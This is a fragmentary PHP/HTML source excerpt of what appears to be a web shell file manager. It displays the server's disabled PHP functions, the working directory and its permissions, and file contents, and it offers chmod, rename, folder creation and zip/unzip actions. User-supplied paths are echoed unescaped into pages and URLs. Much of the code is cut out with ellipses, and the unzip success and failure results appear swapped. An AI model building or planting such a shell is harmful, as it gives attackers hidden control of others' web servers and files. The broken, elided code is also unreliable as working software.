...
<thead>
    ...
    <tr>
    	<td colspan="5" class="not">
    		<center>
    			<a class="tool" href="http://<?= $_SERVER['HTTP_HOST'] .
           $_SERVER['SCRIPT_NAME'] ?>">HOME</a>
    ...
    <tr>
    	<td colspan="5">
    		<center>
    			<span class="strong"><?= pwd() ?> ( <?= permission(
     cwd(),
     perms(cwd())
 ) ?> )</span>
    		</center>
...
if (isset($_GET['info'])) { ?>
	<tr>
		<td style="width:150px;">
			...
			Disable Function : <?= !empty(ini_get("disable_functions"))
       ? "<font color=red>" . ini_get("disable_functions") . "</font>"
 ...
 switch ($file) {
     case filetype($file) == 'file':
         if (is_file($file)) { ?>
				...
				<tr>
					<td class="not" colspan="3">
						<textarea class="edit" readonly><?php print htmlspecialchars(
          file_get_contents(basename($file))
      ); ?></textarea>
					</td>
				</tr>
			<?php }
...
if (@$_GET['act'] == 'img') {
   ...
   ?>
	...
	<tr>
		<td class="not" colspan="3">
			<center>
				<img class="img" src="http://<?= $_SERVER['HTTP_HOST'] .
        str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()) .
        '/' .
        basename($file) ?>">
			</center>
		</td>
...
if (@$_GET['act'] == 'mp3') {
	...
	<tr>
		<td class="not" colspan="3">
			<center>
				<audio controls>
					<source src="http://<?= $_SERVER['HTTP_HOST'] .
         str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()) .
         '/' .
         basename($file) ?>" type="audio/mp3">
				</audio>
			</center>
		</td>
	</tr>
		...
		<tr>
			<td class="not">
				<center>
					<div class="action">
						<?= @$alert ?><br><br>
						<input class="action" type="text" name="dir" value="<?= cwd() .
          '/' ?>newfolder"><br><br>
...
if (isset($_GET['chmod'])) {
	...
	<form method="post">
     ...
     ?>
		...
		<tr>
			<td class="not" colspan="3">
				<input class="action" type="text" name="mode" value="<?= substr(
...
if (isset($_GET['rename'])) {
    ...
    if (isset($_POST['submit'])) {
        if (renames($file, $_POST['newname'])) { ?>
			<script type="text/javascript">window.location='?path=<?= cwd() ?>'</script>
			<?php } else {$alert = alert("failed", "rename");}
    }
    ?>
	<form method="post">
		<tr>
     ...
     switch ($ext) {
         case filetype($file) == 'file':
             if (
                 is_dir($file)
             ) { ?><a class="fo act t" href="?path=<?= $file ?>">OPEN</a><?php } elseif (
                 is_file($file)
...
?>
  ...
  foreach ($scandir as $dir) {
      ...
      if ($dir === '.' || $dir === '..') {
          $action =
              "<a class='sa si' href='?path=" .
              cwd() .
              "&action=path'>action</a>";
      } else {
          $action =
              '<a class="sa si" href="?path=' .
              cwd() .
...
<tr>
	<td class="not" colspan="3">
		<select name="mode" style="width:100%;">
			...
			<?php foreach ($scandir as $file_zip) {
       if (is_file($file_zip)) {
           $ext = pathinfo($file_zip, PATHINFO_EXTENSION);
           switch (
               $ext
           ) { case 'zip': ?> <option value="unzip">Unzip ( <?= $file_zip ?> )</option> <?php break;case 'rar': ?> <option value="unzip">Unzip ( <?= $file_zip ?> )</option> <?php break;}
       }
   } ?>
		</select>
	</td>
        ...
        switch ($_POST['mode']) {
            ...
            case '2':
                if (
                    zip(
                        basename($value),
                        cwd() . "/" . date("dmy_h-i") . ".zip"
                    )
                ) {
                    alert(
                        "success",
                        "<u>" . basename($value) . "</u> to zip !"
                    );
                } else {
                ...
                switch ($ext) {
                    case 'zip':
                        if (unzip($file_zip, cwd())) {
                            print '<meta http-equiv="refresh" content="0;url=?path=' .
                                cwd() .
                                '&unzip=failed&filename=' .
                                $file_zip .
                                '">';
                        } else {
                            print '<meta http-equiv="refresh" content="0;url=?path=' .
                                cwd() .
                                '&unzip=success&filename=' .
                                $file_zip .
                                '">';
                        }
                        break;
	...
	<form method="post">
		<tr>
			<td colspan="2" class="not cp">
				<input style="padding:7px;" class="action" type="text" name="" value="<?= basename(
        $file
    ) ?>" readonly>
			</td>
			<td class="not">
...
if ($_GET['unzip'] == 'success') {
    alert(
        "success",
        "<u>" . $_GET['filename'] . "</u> Unzip to <u>" . cwd() . "</u>"
    );
